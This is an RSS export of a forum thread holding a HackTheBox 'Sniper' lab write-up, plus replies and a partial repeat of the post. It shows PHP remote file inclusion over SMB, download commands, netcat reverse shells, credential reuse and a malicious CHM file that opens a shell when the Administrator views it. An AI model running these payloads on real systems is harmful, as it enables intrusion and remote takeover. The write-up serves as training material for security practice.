<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>HackTheBox Writeup: Sniper</title>
    <link>https://d.clarkee.co.uk/t/hackthebox-writeup-sniper/20112</link>
    <description>![image|598x381](upload://dGgVB0JxiSOHnJDpX8EKmuHG6ZV.png) 

I haven&#39;t posted one of my writeups here in a while so I thought I would make one for an interesting box that just got retired: Sniper.

I really liked this box because it went places that I haven&#39;t seen other boxes exploring, like RFI with a twist and creating a malicious CHM documentation file to escalate privileges, all things worth learning.

---

## Enumeration

An nmap scan probing all ports for services and running all default NSE scripts only returns a few results, RPC, SMB, and HTTP:
 
```
┌─[baud@parrot]─[~/HTB/sniper]
└──╼ $sudo nmap -sV -sC -p- -oA fullScan -T4 10.10.10.151
[sudo] password for baud: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-26 02:20 CET
Nmap scan report for 10.10.10.151
Host is up (0.041s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h01m53s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-26T09:25:03
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.42 seconds
```

SMB NULL sessions are not allowed so not much enumeration is possible with tools like enum4linux:

```
┌─[✗]─[baud@parrot]─[~/HTB/sniper]
└──╼ $enum4linux 10.10.10.151 2&gt;/dev/null
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Feb 26 02:40:55 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.151
RID Range ........ 500-550,1000-1050
Username ......... &#39;&#39;
Password ......... &#39;&#39;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.151    |
 ==================================================== 
[E] Can&#39;t find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.151    |
 ============================================ 
Looking up status of 10.10.10.151
No reply from 10.10.10.151

 ===================================== 
|    Session Check on 10.10.10.151    |
 ===================================== 
[E] Server doesn&#39;t allow session using username &#39;&#39;, password &#39;&#39;.  Aborting remainder of tests.
```

The homepage of the web server does not contain anything useful other than a bunch of links to other pages:

![image|482x500](upload://vgZU1Ko9CMAIFZRskv2SSlpgLP6.png) 

One of the pages is a blog with a few placeholder posts in it and two dropdown menus:

![image|393x500](upload://9hN4tnG1MGCLb7k7AVxD2m7ogAY.png) 

There&#39;s also a simple login portal:

![image|690x479](upload://1fp1dJowNEDd75ALrXguL722Hda.png) 

The portal allows to create an account via the registration.php page:

![image|690x479](upload://d0M9mQ1ZZrbSY0lWJ2tNSDAWleh.png) 

Registering a new account and using it to login takes to an under construction page from where the only option is to log out:

![image|597x356](upload://y1ISn1ALm2xlS3p09Av45yG8XrL.png) 

Back to the blog, the drop-down Language menu has a few links, each of which redirects to the same blog page but passing it an argument containing the name of a PHP page:

```
http://10.10.10.151/blog/?lang=blog-en.php
```

Trivial LFI payloads on the parameter don&#39;t seem to work, these are the ones I&#39;ve tried myself:

```
http://10.10.10.151/blog/index.php --&gt; loads properly
http://10.10.10.151/blog/?lang=blog-en.php --&gt; loads properly
http://10.10.10.151/blog/blog-es.php --&gt; loads properly
http://10.10.10.151/blog/?lang=././blog-en.php --&gt; loads properly
http://10.10.10.151/blog/?lang=../index.php --&gt; not found
http://10.10.10.151/blog/?lang=..../index.php --&gt; not found
http://10.10.10.151/blog/?lang=.../index.php --&gt; not found
http://10.10.10.151/blog/?lang=../blog/blog-en.php --&gt; not found
http://10.10.10.151/blog/?lang=../../../../../index.php --&gt; not found
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2findex.php --&gt; ..%2f..%2f..%2f..%2f..%2findex.php
```

---

## Exploitation: RFI via SMB

At this point I tried RFI as well, which is pretty rare but it never hurts to try. It turns out that the web application will not include any page that is passed to it via HTTP, but it will access pages located in shared folders via SMB:

```
http://10.10.10.151/blog/?lang=\\10.10.14.144\sniper\hello.php
```

We can set up a Samba share to welcome the connection and serve a PHP page to the web application by adding an entry to /usr/share/samba/smb.conf fpr a dedicated share:

```
[sniper]
path = /home/baud/HTB/sniper   
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
```

Restart the smbd service:

```
baud@kali:~$ sudo service smbd restart
```

Verify that the share now exists:

```
baud@kali:~$ smbclient -N -L localhost

	Sharename       Type      Comment
	---------       ----      -------
	sniper          Disk      
	IPC$            IPC       IPC Service (Heyo)
SMB1 disabled -- no workgroup available
```

Put any PHP file of your choice in there and import it through the URL:

![image|226x115](upload://koTlQlixZdyZY7EwyerDOTgs1AV.png) 

Now we can execute any PHP code in the context of the vulnerable web application, for example we can demonstrare RCE with a simple &quot;whoami&quot;:

```php
&lt;?php
        echo &quot;&lt;pre&gt;&quot;;
        system(&#39;whoami&#39;);
        echo &quot;&lt;/pre&gt;&quot;;
        die;
?&gt;
```

Which returns in the page:

![image|231x83](upload://6iy6KGansyECgy3BAypjHEtmGDh.png) 

We could keep doing this manually for each command, for example here&#39;s how to download files on the host:

```php
&lt;?php
	$commands = &quot;powershell -Command \&quot;IWR http://10.10.14.144/nc.exe -OutFile ./nc.exe\&quot;&quot;;
        echo &quot;&lt;pre&gt;&quot;;
        system($commands);
        echo &quot;&lt;/pre&gt;&quot;;
        die;
?&gt;
```

Although nc.exe is flagged as malicious and deleted by Defender. A Nishang reverse shell with download cradle does not work either, and it is easy to tell why with this payload:

```php
&lt;?php
	$commands = &quot;powershell -Command \&quot;\$ExecutionContext.SessionState.LanguageMode\&quot;&quot;;
        echo &quot;&lt;pre&gt;&quot;;
        system($commands);
        echo &quot;&lt;/pre&gt;&quot;;
        die;
?&gt;
```

The result is:

![image|228x82](upload://nOKRqlueZMo77LdF062ahc7ME15.png) 

So PowerShell&#39;s constrained language is also enabled, limiting the actions we can perform with it.

After getting tired of changing the payload manually every time I found a [web shell](https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php) that works out of the box without being destroyed by Defender:

![image|690x375](upload://7KpCAElXJxmbmav44OlfuOVhkrq.png) 

From here shell commands have to be escaped slightly, for example:

![image|496x500](upload://pNcPviEX4XgJfqLLrMYlLbTr4Uh.png) 

---

## Privilege Escalation #1: Passwsord Reuse + PSSession

The user folder has an old version of the registration page but the most interesting part is the db.php file in the same directory, which has the database credentials in it:

```php
&lt;?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect(&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz/B8xQ~2VM&quot;,&quot;sniper&quot;);
// Check connection
if (mysqli_connect_errno())
  {
  echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();
  }
?&gt;
```

At first I didn&#39;t mind it too much and started enumerating MySQL by creating PHP pages to query it for all its databases and tables but with no great results (the only thing I found was an MD5 hash for a &quot;superuser&quot; user which I could not crack).


After a little break and some thinking I forgot to check for one of the weaknesses I so often underestimate: password reuse. I found out the database password is basically Chris&#39; account password, I verified this with smbclient by being able to list the shares with his account:

```aaa
baud@kali:~/HTB/sniper$ smbclient -U chris -L \\\\10.10.10.151
Enter WORKGROUP\chris&#39;s password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

As established at the beginning, anonymous users are not allowed to list shares on the box, meaning the credentials are correct:

```aaa
User: chris
Pass: 36mEAhz/B8xQ~2VM
```

Still, Chris can&#39;t access the C$ share anyway:

```aaa
baud@kali:~/HTB/sniper$ smbclient -U chris \\\\10.10.10.151\\C$
Enter WORKGROUP\chris&#39;s password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```

With a set of working credentials and nowhere to use them I was forced to drop files on the box. My first try was with the nc-family of binaries, using this command:

```powershell
powershell -command iwr http://10.10.14.144/ncat.exe -outfile \&quot;c:\users\all users\data\ncat.exe\&quot;&quot;
```

But Defender is always ready to stop the fun by flagging the binaries. Here&#39;s what I tried downloading and what worked:

```aaa
nc --&gt; flagged
ncat --&gt; flagged
nc64 --&gt; works!
```

After downloading nc64 on the box I can call it from the web shell to contact my own host with a reverse shell:

```aaa
&quot;c:\users\all users\data\nc64.exe&quot; -e cmd.exe 10.10.14.144 9999
```

And my listener receives a connection giving me a proper shell at last:

```aaa
baud@kali:~/HTB/sniper$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49737
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\blog&gt;
```

We can become Chris by starting a PSSession with his credentials, since PSSessions aren&#39;t blocked by the CLM. First we enter the PowerShell console:

```aaa
C:\inetpub\wwwroot\blog&gt;powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\blog&gt;
```

Then we put the user&#39;s password in a variable as a SecureString:

```aaa
PS C:\inetpub\wwwroot\blog&gt; $pw = ConvertTo-SecureString -String &quot;36mEAhz/B8xQ~2VM&quot; -AsPlainText -force
```

The password is used to create a PSCredential object together with the username:

```aaa
PS C:\inetpub\wwwroot\blog&gt; $pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList &quot;.\chris&quot;, $pw
```

Now the Enter-PSSession cmdlet can be used to start a PSSession using that PSCredential object, which makes us impersonate Chris:

```aaa
PS C:\inetpub\wwwroot\blog&gt; Enter-PSSession -ComputerName localhost -Credential $pp
[localhost]: PS C:\Users\Chris\Documents&gt;
```

I downloaded nc64.exe again to get a proper reverse shell instead of the uncomfortable PSSession:

```aaa
[localhost]: PS C:\Users\Chris\Documents&gt; Invoke-Command -ScriptBlock { IWR http://10.10.14.144/nc64.exe -outfile C:\Users\Chris\Documents\nc64.exe }
[localhost]: PS C:\Users\Chris\Documents&gt; Invoke-Command -ScriptBlock { C:\Users\Chris\Documents\nc64.exe -e cmd.exe 10.10.14.144 9090 }
```

I could have easily used the already downloaded nc64 but for some reason I was having issues navigating folders inside the PSSession so it was more comfortable to have another nc64 in the . directory. The new incoming connection is caught and we have a shell as Chris:

```aaa
baud@kali:~/HTB/sniper$ nc -lvnp 9090
listening on [any] 9090 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49779
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Chris\Documents&gt;dir /a
dir /a
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\Documents

02/28/2020  02:53 PM    &lt;DIR&gt;          .
02/28/2020  02:53 PM    &lt;DIR&gt;          ..
04/11/2019  06:04 AM               402 desktop.ini
04/11/2019  06:04 AM    &lt;JUNCTION&gt;     My Music [C:\Users\Chris\Music]
04/11/2019  06:04 AM    &lt;JUNCTION&gt;     My Pictures [C:\Users\Chris\Pictures]
04/11/2019  06:04 AM    &lt;JUNCTION&gt;     My Videos [C:\Users\Chris\Videos]
02/28/2020  02:53 PM            45,272 nc64.exe
               2 File(s)         45,674 bytes
               5 Dir(s)  17,932,124,160 bytes free

C:\Users\Chris\Documents&gt;
```

While the user flag is in Chris&#39; desktop, his downloads folder contains an interesting instructions.chm file:

```aaa
C:\Users\Chris&gt;dir /a downloads
dir /a downloads
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\downloads

04/11/2019  07:36 AM    &lt;DIR&gt;          .
04/11/2019  07:36 AM    &lt;DIR&gt;          ..
04/11/2019  06:04 AM               282 desktop.ini
04/11/2019  07:36 AM            10,462 instructions.chm
               2 File(s)         10,744 bytes
               2 Dir(s)  17,932,124,160 bytes free

C:\Users\Chris&gt;
```

CHM files are typically shipped witht a program, containing its official documentation. The file can be transfered to us for analysis via nc64:

```aaa
C:\Users\Chris\Downloads&gt;..\Documents\nc64.exe -w 3 10.10.14.144 9191 &lt; instructions.chm
```

And saved locally like this:

```aaa
baud@kali:~/HTB/sniper$ nc -lvnp 9191 &gt; instructions.chm
listening on [any] 9191 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49810
baud@kali:~/HTB/sniper$ file instructions.chm 
instructions.chm: MS Windows HtmlHelp Data
```

This is what the file looks like:

![image|576x500](upload://ecvYYcKzoO9VWnj0wFmoSEWBTuO.png) 

This shitty work Chris is talking about is mentioned in the note.txt file in C:\Docs, where we get to appreciate the relationship between this evil CEO and poor coder Chris:

```aaa
C:\Users\Chris\Downloads&gt;dir /a c:\docs
dir /a c:\docs
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of c:\docs

10/01/2019  12:04 PM    &lt;DIR&gt;          .
10/01/2019  12:04 PM    &lt;DIR&gt;          ..
04/11/2019  08:31 AM               285 note.txt
04/11/2019  08:17 AM           552,607 php for dummies-trial.pdf
               2 File(s)        552,892 bytes
               2 Dir(s)  17,930,002,432 bytes free

C:\Users\Chris\Downloads&gt;more c:\docs\note.txt
more c:\docs\note.txt
Hi Chris,
        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it.

Regards,
Sniper CEO.

C:\Users\Chris\Downloads&gt;
```

I absolutely love the &quot;PHP for dummies&quot; pdf in the directory just to tease him further on his bad PHP skills. Anyway he mentions dropping the documentation in the Docs folder, probably in CHM format because the file from earlier was supposed to be the Android app documentation.

---

## Privilege Escalation #2: RCE With CHM File

It&#39;s obvious that we have to finish Chris&#39; job and make a malicious CHM file that the Administrator will open at one point. 

Using [this](https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7) GitHub page as reference I started running a few tests locally after installing the HTML Help WorkShop on a Windows 10 box. I&#39;m pretty sure there&#39;s a way to craft CHM files on Linux too but if I remember correctly it involves Wine and when I use Wine nothing works, so I went the Windows way.

This is the base code provided by GitHub:

```html
&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;
  &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;
  &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;
  &lt;PARAM name=&quot;Item1&quot; value=&#39;,cmd.exe,/c copy /Y C:\Windows\system32\rundll32.exe %TEMP%\out.exe &gt; nul &amp;&amp; %TEMP%\out.exe javascript:&quot;\..\mshtml RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1:8000/test.vbs&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im out.exe&quot;,0,true);}&#39;&gt;
  &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;
&lt;/OBJECT&gt;
&lt;SCRIPT&gt;
  x.Click();
&lt;/SCRIPT&gt;
```

Basically the code simulates a button that presses itself triggering the payload contained in Item1, which is far more complicated than it needs to be for this single challenge so I&#39;ll make it simpler.

After obtaining the a.html file contained in the original CHM found on the box by unpacking it with 7zip we can simply change the code to make it look like this:

```html
&lt;html&gt;
&lt;body&gt;
&lt;h1&gt;Sniper Android App Documentation&lt;/h1&gt;
&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;
  &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;
  &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;
  &lt;PARAM name=&quot;Item1&quot; value=&#39;,cmd.exe,/c c:\users\chris\documents\nc64.exe -e cmd.exe 10.10.14.144 6666&#39;&gt;
  &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;
&lt;/OBJECT&gt;
&lt;SCRIPT&gt;
  x.Click();
&lt;/SCRIPT&gt;
&lt;h2&gt;Table of Contents&lt;/h2&gt;

&lt;p&gt;Pff... This dumb CEO always makes me do all the shitty work. SMH!&lt;/p&gt;
&lt;p&gt;I&#39;m never completing this thing. Gonna leave this place next week. Hope someone snipes him.&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
```

This reuses the nc64 binary dropped in Chris&#39; folder to start yet another reverse shell. Create a new project in the HTML Help WorkShop with that code and compile it, then drop the output CHM file in C:\Docs and soon enough what I can only presume to be the CEO will open it giving us a shell as the Administrator:

```aaa
baud@kali:~/HTB/sniper$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49812
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
sniper\administrator

C:\Windows\system32&gt;
```

And that was Sniper.</description>
    
    <lastBuildDate>Sat, 28 Mar 2020 22:39:20 +0000</lastBuildDate>
    <category>Hackthebox Writeups</category>
    <atom:link href="https://d.clarkee.co.uk/t/hackthebox-writeup-sniper/20112.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>HackTheBox Writeup: Sniper</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://d.clarkee.co.uk/t/hackthebox-writeup-sniper/20112/4">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/hackthebox-writeup-sniper/20112/4</link>
        <pubDate>Tue, 28 Jul 2020 10:53:06 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-20112-4</guid>
        <source url="https://d.clarkee.co.uk/t/hackthebox-writeup-sniper/20112.rss">HackTheBox Writeup: Sniper</source>
      </item>
      <item>
        <title>HackTheBox Writeup: Sniper</title>
        <dc:creator><![CDATA[Baud]]></dc:creator>
        <description><![CDATA[
            <p>Thank you for the kind feedback!</p>
<aside class="quote no-group" data-username="Tyr4n7" data-post="2" data-topic="20112">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/user_avatar/d.clarkee.co.uk/tyr4n7/48/10969_2.png" class="avatar"> Tyr4n7:</div>
<blockquote>
<p>I have a question though: Was it possible to RFI through HTTP?</p>
</blockquote>
</aside>
<p>No, the web application is protected against classic RFI attacks, and this is the box that made me discover how it is possible to use SMB to completely bypass those restrictions under Windows.</p>
<p>It seems that even with the <em>allow_url_fopen</em> and <em>allow_url_include</em> options disabled PHP still allows inclusion via shared folders because on the upper level Windows treats shares like local folders, tricking PHP into making it believe a local file is being imported, which is the expected behavior for that web app and so was allowed.</p>
          <p><a href="https://d.clarkee.co.uk/t/hackthebox-writeup-sniper/20112/3">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/hackthebox-writeup-sniper/20112/3</link>
        <pubDate>Sat, 28 Mar 2020 22:39:20 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-20112-3</guid>
        <source url="https://d.clarkee.co.uk/t/hackthebox-writeup-sniper/20112.rss">HackTheBox Writeup: Sniper</source>
      </item>
      <item>
        <title>HackTheBox Writeup: Sniper</title>
        <dc:creator><![CDATA[Tyr4n7]]></dc:creator>
        <description><![CDATA[
            <p>That’s an excellent write up as well as an interesting box, thanks for sharing <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"><br>
I mainly liked:</p>
<ul>
<li>the fact that you thought of RFI through SMB</li>
<li>privilege escalation to SYSTEM being  a simple compiled HTML. I wouldn’t have ever thought of that, thinking that the box author would make you think of a sorta-like social-engineering move, in a real scenario that’s really applicable.</li>
</ul>
<p>I have a question though: Was it possible to RFI through HTTP?</p>
          <p><a href="https://d.clarkee.co.uk/t/hackthebox-writeup-sniper/20112/2">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/hackthebox-writeup-sniper/20112/2</link>
        <pubDate>Sat, 28 Mar 2020 21:18:56 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-20112-2</guid>
        <source url="https://d.clarkee.co.uk/t/hackthebox-writeup-sniper/20112.rss">HackTheBox Writeup: Sniper</source>
      </item>
      <item>
        <title>HackTheBox Writeup: Sniper</title>
        <dc:creator><![CDATA[Baud]]></dc:creator>
        <description><![CDATA[
            <p><span alt="image" data-base62-sha1="dGgVB0JxiSOHnJDpX8EKmuHG6ZV" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>I haven’t posted one of my writeups here in a while so I thought I would make one for an interesting box that just got retired: Sniper.</p>
<p>I really liked this box because it went places that I haven’t seen other boxes exploring, like RFI with a twist and creating a malicious CHM documentation file to escalate privileges, all things worth learning.</p>
<hr>
<h2>Enumeration</h2>
<p>An nmap scan probing all ports for services and running all default NSE scripts only returns a few results, RPC, SMB, and HTTP:</p>
<pre><code class="lang-auto">┌─[baud@parrot]─[~/HTB/sniper]
└──╼ $sudo nmap -sV -sC -p- -oA fullScan -T4 10.10.10.151
[sudo] password for baud: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-26 02:20 CET
Nmap scan report for 10.10.10.151
Host is up (0.041s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h01m53s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-26T09:25:03
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.42 seconds
</code></pre>
<p>SMB NULL sessions are not allowed so not much enumeration is possible with tools like enum4linux:</p>
<pre><code class="lang-auto">┌─[✗]─[baud@parrot]─[~/HTB/sniper]
└──╼ $enum4linux 10.10.10.151 2&gt;/dev/null
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Feb 26 02:40:55 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.151
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.151    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.151    |
 ============================================ 
Looking up status of 10.10.10.151
No reply from 10.10.10.151

 ===================================== 
|    Session Check on 10.10.10.151    |
 ===================================== 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
</code></pre>
<p>The homepage of the web server does not contain anything useful other than a bunch of links to other pages:</p>
<p><span alt="image" data-base62-sha1="vgZU1Ko9CMAIFZRskv2SSlpgLP6" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>One of the pages is a blog with a few placeholder posts in it and two dropdown menus:</p>
<p><span alt="image" data-base62-sha1="9hN4tnG1MGCLb7k7AVxD2m7ogAY" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>There’s also a simple login portal:</p>
<p><span alt="image" data-base62-sha1="1fp1dJowNEDd75ALrXguL722Hda" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>The portal allows to create an account via the registration.php page:</p>
<p><span alt="image" data-base62-sha1="d0M9mQ1ZZrbSY0lWJ2tNSDAWleh" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Registering a new account and using it to login takes to an under construction page from where the only option is to log out:</p>
<p><span alt="image" data-base62-sha1="y1ISn1ALm2xlS3p09Av45yG8XrL" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Back to the blog, the drop-down Language menu has a few links, each of which redirects to the same blog page but passing it an argument containing the name of a PHP page:</p>
<pre><code class="lang-auto">http://10.10.10.151/blog/?lang=blog-en.php
</code></pre>
<p>Trivial LFI payloads on the parameter don’t seem to work, these are the ones I’ve tried myself:</p>
<pre><code class="lang-auto">http://10.10.10.151/blog/index.php --&gt; loads properly
http://10.10.10.151/blog/?lang=blog-en.php --&gt; loads properly
http://10.10.10.151/blog/blog-es.php --&gt; loads properly
http://10.10.10.151/blog/?lang=././blog-en.php --&gt; loads properly
http://10.10.10.151/blog/?lang=../index.php --&gt; not found
http://10.10.10.151/blog/?lang=..../index.php --&gt; not found
http://10.10.10.151/blog/?lang=.../index.php --&gt; not found
http://10.10.10.151/blog/?lang=../blog/blog-en.php --&gt; not found
http://10.10.10.151/blog/?lang=../../../../../index.php --&gt; not found
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2findex.php --&gt; ..%2f..%2f..%2f..%2f..%2findex.php
</code></pre>
<hr>
<h2>Exploitation: RFI via SMB</h2>
<p>At this point I tried RFI as well, which is pretty rare but it never hurts to try. It turns out that the web application will not include any page that is passed to it via HTTP, but it will access pages located in shared folders via SMB:</p>
<pre><code class="lang-auto">http://10.10.10.151/blog/?lang=\\10.10.14.144\sniper\hello.php
</code></pre>
<p>We can set up a Samba share to welcome the connection and serve a PHP page to the web application by adding an entry to /usr/share/samba/smb.conf fpr a dedicated share:</p>
<pre><code class="lang-auto">[sniper]
path = /home/baud/HTB/sniper   
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
</code></pre>
<p>Restart the smbd service:</p>
<pre><code class="lang-auto">baud@kali:~$ sudo service smbd restart
</code></pre>
<p>Verify that the share now exists:</p>
<pre><code class="lang-auto">baud@kali:~$ smbclient -N -L localhost

	Sharename       Type      Comment
	---------       ----      -------
	sniper          Disk      
	IPC$            IPC       IPC Service (Heyo)
SMB1 disabled -- no workgroup available
</code></pre>
<p>Put any PHP file of your choice in there and import it through the URL:</p>
<p><span alt="image" data-base62-sha1="koTlQlixZdyZY7EwyerDOTgs1AV" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Now we can execute any PHP code in the context of the vulnerable web application, for example we can demonstrare RCE with a simple “whoami”:</p>
<pre><code class="lang-php">&lt;?php
        echo "&lt;pre&gt;";
        system('whoami');
        echo "&lt;/pre&gt;";
        die;
?&gt;
</code></pre>
<p>Which returns in the page:</p>
<p><span alt="image" data-base62-sha1="6iy6KGansyECgy3BAypjHEtmGDh" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>We could keep doing this manually for each command, for example here’s how to download files on the host:</p>
<pre><code class="lang-php">&lt;?php
	$commands = "powershell -Command \"IWR http://10.10.14.144/nc.exe -OutFile ./nc.exe\"";
        echo "&lt;pre&gt;";
        system($commands);
        echo "&lt;/pre&gt;";
        die;
?&gt;
</code></pre>
<p>Although nc.exe is flagged as malicious and deleted by Defender. A Nishang reverse shell with download cradle does not work either, and it is easy to tell why with this payload:</p>
<pre><code class="lang-php">&lt;?php
	$commands = "powershell -Command \"\$ExecutionContext.SessionState.LanguageMode\"";
        echo "&lt;pre&gt;";
        system($commands);
        echo "&lt;/pre&gt;";
        die;
?&gt;
</code></pre>
<p>The result is:</p>
<p><span alt="image" data-base62-sha1="nOKRqlueZMo77LdF062ahc7ME15" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>So PowerShell’s constrained language is also enabled, limiting the actions we can perform with it.</p>
<p>After getting tired of changing the payload manually every time I found a <a href="https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php" rel="nofollow noopener">web shell</a> that works out of the box without being destroyed by Defender:</p>
<p><span alt="image" data-base62-sha1="7KpCAElXJxmbmav44OlfuOVhkrq" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>From here shell commands have to be escaped slightly, for example:</p>
